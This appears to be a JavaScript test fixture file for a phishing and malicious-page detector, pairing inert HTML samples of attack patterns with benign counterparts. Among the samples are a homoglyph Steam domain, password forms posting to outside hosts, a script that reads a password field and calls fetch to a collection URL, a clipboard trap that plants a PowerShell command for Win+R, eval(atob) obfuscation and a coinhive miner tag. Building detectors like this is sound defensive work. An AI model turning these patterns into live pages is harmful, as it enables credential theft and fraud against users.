// Authored, inert HTML strings. They are parsed as text only: no browser,
// JavaScript evaluator, shell, specimen, provider or network call is involved.
const fixture=(module,rule,html,url='https://store.example/')=>({module,rule,html,url});
export const detectionFixtures=[
 fixture('url-identity','mixed_script_host','<p>Owned fixture</p>','https://stеam.example/'),
 fixture('brand-domain','brand_in_unofficial_host','<p>Owned fixture</p>','https://steam.login.example/'),
 fixture('form-destinations','sensitive_form_external','<form method="post" action="https://other.example/login"><input type="password"></form>'),
 fixture('form-methods','sensitive_form_get','<form><input type="password"></form>'),
 fixture('verification-codes','code_form_boundary','<form action="https://other.example/verify" method="post"><input autocomplete="one-time-code"></form>'),
 fixture('wallet-secrets','wallet_secret_form','<form method="post"><textarea name="seed_phrase"></textarea></form>'),
 fixture('payment-boundary','unencrypted_payment','<form method="post" action="http://other.example/pay"><input autocomplete="cc-number"></form>'),
 fixture('script-transport','active_mixed_content','<script src="http://cdn.example/app.js"></script>'),
 fixture('script-obfuscation','encoded_dynamic_code','<script>eval(atob("aW5lcnQ="));</script>'),
 fixture('credential-network','credential_external_request','<script>const value=document.querySelector("input[type=password]").value;fetch("https://other.example/collect");</script>'),
 fixture('clipboard-traps','clipboard_shell_trap','<p>Open Windows + R to run a command.</p><script>navigator.clipboard.writeText("powershell -NoProfile # inert fixture");</script>'),
 fixture('script-navigation','external_script_redirect','<script>window.location.href="https://other.example/next";</script>'),
 fixture('html-redirects','html_external_redirect','<meta http-equiv="refresh" content="0;url=https://other.example/next">'),
 fixture('link-mismatch','link_destination_mismatch','<a href="https://other.example/">https://store.example/</a>'),
 fixture('frame-boundaries','external_login_frame','<iframe src="https://other.example/login"></iframe>'),
 fixture('embedded-plugins','active_legacy_plugin','<object type="application/x-shockwave-flash"></object>'),
 fixture('service-workers','service_worker_registration','<script>navigator.serviceWorker.register("/sw.js");</script>'),
 fixture('encoded-documents','active_embedded_document','<iframe src="data:text/html;base64,PGI+aW5lcnQ8L2I+"></iframe>'),
 fixture('web-mining','known_mining_script','<script src="https://coinhive.com/lib/fixture.js"></script>'),
 fixture('resource-integrity','external_script_without_integrity','<script src="https://cdn.example/library.js"></script>')
];
export const benignFixtures=[
 {name:'plain-public-page',url:'https://store.example/',html:'<title>Game Store</title><p>Public information</p><a href="/about">About</a>'},
 {name:'same-origin-password-post',url:'https://store.example/',html:'<form method="post"><input type="password"></form>'},
 {name:'same-origin-code-post',url:'https://store.example/',html:'<form method="post"><input autocomplete="one-time-code"></form>'},
 {name:'official-brand-domain',url:'https://help.steampowered.com/',html:'<p>Steam help</p>'},
 {name:'unrelated-substring',url:'https://steamship.example/',html:'<p>Ship information</p>'},
 {name:'educational-wording',url:'https://store.example/',html:'<h1>Avoid free gems scams</h1><p>Do not use crack or cheat downloads.</p>'},
 {name:'comment-only-obfuscation',url:'https://store.example/',html:'<script>// eval(atob("inert"));\nconst count=1;</script>'},
 {name:'string-only-obfuscation',url:'https://store.example/',html:'<script>const example="eval(atob(hello))";</script>'},
 {name:'json-data',url:'https://store.example/',html:'<script type="application/ld+json">{"example":"eval(atob())"}</script>'},
 {name:'comment-only-credential-code',url:'https://store.example/',html:'<script>/* document.querySelector("password").value;fetch("https://other.example/") */ const count=1;</script>'},
 {name:'safe-pwa-context',url:'https://store.example/',html:'<script>navigator.serviceWorker.register("/sw.js");</script>'},
 {name:'ordinary-clipboard',url:'https://store.example/',html:'<p>Share this page.</p><script>navigator.clipboard.writeText("https://store.example/");</script>'},
 {name:'nonlatin-domain',url:'https://مثال.example/',html:'<p>Information</p>'},
 {name:'same-origin-redirect',url:'https://store.example/',html:'<script>location.assign("https://store.example/about");</script>'}
];
